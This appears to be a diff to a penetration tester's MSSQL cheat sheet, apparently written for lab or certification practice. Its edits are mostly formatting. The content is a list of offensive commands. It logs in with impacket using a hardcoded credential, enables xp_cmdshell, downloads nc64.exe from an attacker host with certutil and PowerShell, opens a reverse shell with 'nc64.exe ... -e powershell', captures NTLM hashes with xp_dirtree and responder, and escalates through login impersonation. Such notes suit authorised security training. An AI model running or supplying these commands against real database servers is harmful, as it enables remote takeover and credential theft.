@@ -122,11 +122,15 @@ username/username
 # 1433 MSSQL
 
 `impacket-mssqlclient sql_svc:Dolphin1@10.10.138.148 -windows-auth  #Windows login`
+
 `impacket-mssqlclient sql_svc:Dolphin1@10.10.138.148   #user login`
 
 `SELECT @@version   #Current MSSQL Version`
+
 `SELECT DB_NAME()   #Current Database`
+
 `SELECT name FROM sys.databases;  #show DBs`	
+
 `enum_db            #show DBs`
 
 `select * from   <DB name>.INFORMATION_SCHEMA.TABLES  #show tables`
@@ -134,26 +138,36 @@ username/username
 #cmd command	
 
 `EXEC sp_configure 'show advanced options', 1;`
+
 `RECONFIGURE;`
+
 `EXEC sp_configure 'xp_cmdshell', 1;`
+
 `RECONFIGURE;`
+
 `EXEC xp_cmdshell ' whoami /priv '`
 
 `xp_cmdshell "certutil -urlcache -f http://192.168.45.247/nc64.exe nc64.exe"  #If cmd command dose not work, upgrade to poershell`
+
 `xp_cmdshell "powershell -Command "(New-Object Net.WebClient).DownloadFile(''http://10.10.149.147:1235/nc64.exe'',''C:\Windows\Temp\nc64.exe'')"`
+
 `xp_cmdshell "/windows/temp/nc64.exe 10.10.149.147 1234 -e powershell"`
 	
 hash capture
 
 `xp_dirtree \\192.168.1.210\shared`
+
 `responder -I tun0   #When the SQL service is running under a machine account, the authentication process returns the machine account hash, which is not crackable (e.g., $DC)`
 
+
 `enum_impersonate  #impersonate`
+
 `EXECUTE AS LOGIN = 'username to impersonate'  #impersonate`
+
 `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'  #impersonate`
 
 
-<MSSQL Cheetsheet>
+**MSSQL Cheetsheet**
 
 https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
 https://kwcsec.gitbook.io/the-red-team-handbook/infrastructure/sql/ms-sql/privilege-escalation
